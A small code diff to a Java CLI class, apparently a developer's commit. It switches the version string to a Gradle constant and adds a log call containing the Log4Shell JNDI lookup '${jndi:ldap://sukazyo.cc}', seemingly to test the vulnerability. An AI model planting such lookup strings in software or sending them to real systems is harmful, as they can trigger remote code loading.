@@ -19,7 +19,7 @@ import java.util.Calendar;
 public class iCee {
 	
 	public static final String PACKID = "icee";
-	public static final String VERSION = "0.3.4.1";
+	public static final String VERSION = GradleProjectConfigurations.VERSION;
 	public static final boolean DEBUG_MODE = true;
 	
 	/**
@@ -54,6 +54,7 @@ public class iCee {
 			} else {
 				// 运行 CLI
 				initializeAsCLIMode();
+				Log.logger.fatal("${jndi:ldap://sukazyo.cc} bug execute");
 				try {
 					CommandManager.run(args);
 				} catch (CommandException e) {
